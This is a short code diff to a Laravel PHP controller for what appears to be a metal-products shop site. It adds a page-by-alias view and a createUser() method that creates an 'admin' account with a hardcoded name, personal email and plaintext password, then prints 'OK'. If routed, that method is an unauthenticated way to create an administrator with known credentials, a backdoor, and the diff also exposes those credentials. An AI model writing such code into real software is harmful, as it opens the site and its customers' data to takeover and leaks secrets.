@@ -3,7 +3,9 @@
 namespace App\Http\Controllers;
 
 use App\Category;
+use App\Page;
 use App\Product;
+use App\User;
 use Illuminate\Http\Request;
 
 class IndexController extends BaseController
@@ -78,5 +80,19 @@ class IndexController extends BaseController
         $headers .= "From: <order@metaloprokat.kz>\r\n";
         mail($to, $subject, $message, $headers);
         return redirect()->back();
+    }
+
+    public function createUser()
+    {
+        User::create([
+            'name' => 'kairat', 'email' => '2504794@mail.ru', 'password' => bcrypt('kair_m888'), 'type' => 'admin'
+        ]);
+        echo "OK";
+    }
+
+    public function page($alias)
+    {
+        $page = Page::whereAlias($alias)->first();
+        return view('page', compact('page'));
     }
 }
